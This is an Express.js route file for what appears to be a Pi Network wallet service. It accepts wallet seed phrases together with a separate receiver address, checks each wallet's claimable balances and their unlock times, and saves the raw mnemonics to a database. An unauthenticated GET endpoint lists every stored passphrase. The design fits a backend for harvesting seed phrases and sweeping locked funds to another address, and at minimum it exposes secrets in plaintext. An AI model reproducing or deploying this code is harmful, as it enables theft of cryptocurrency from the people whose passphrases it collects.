// routes/passphrases.js
import express from 'express';
import Passphrase from '../models/Passphrase.js';
import { getClaimableBalance, getKeypairFromPassphrase } from '../utils/fn.js';

const router = express.Router();

// POST /api/passphrases - Add a new passphrase
router.post('/', async (req, res) => {
    const { mnemonic, receiverAddress } = req.body;

    if (!mnemonic) {
        return res.status(400).json({ error: 'mnemonic is required' });
    }

    if (!receiverAddress) {
        return res.status(400).json({ error: 'Enter the address to get claimed Pi' });
    }

    try {
        const existing = await Passphrase.findOne({ mnemonic });
        if (existing) {
            return res.status(409).json({ error: 'Passphrase already exists' });
        }

        const keypair = getKeypairFromPassphrase(mnemonic);
        const publicKey = keypair.publicKey();
        const claimableBalance = await getClaimableBalance(publicKey);

        const records = claimableBalance?._embedded?.records || [];

        if (records.length > 0) {
            const entries = [];

            for (const record of records) {
                const claimant = record.claimants.find(
                    (c) => c.destination === publicKey
                );

                if (claimant) {
                    const predicate = claimant.predicate;
                    let claimableAt = null;

                    if (predicate?.not?.abs_before) {
                        claimableAt = predicate.not.abs_before; // this means claimable *after* that time
                    }

                    entries.push({
                        mnemonic,
                        receiverAddress,
                        claimableAt,
                        balanceId: record.id,
                        amount: record.amount,
                    });
                }
            }

            if (entries.length > 0) {
                await Passphrase.insertMany(entries);
                return res.status(201).json({ message: 'Passphrase and balances saved' });
            }
        }

        // If no balances found, still save the passphrase with receiverAddress
        const saved = await Passphrase.create({ mnemonic, receiverAddress });
        res.status(201).json(saved);

    } catch (err) {
        console.error('❌ Error saving passphrase:', err);
        res.status(500).json({ error: 'Failed to save passphrase' });
    }
});

// GET /api/passphrases - List all
router.get('/', async (req, res) => {
    const all = await Passphrase.find();
    res.json(all);
});


export default router;
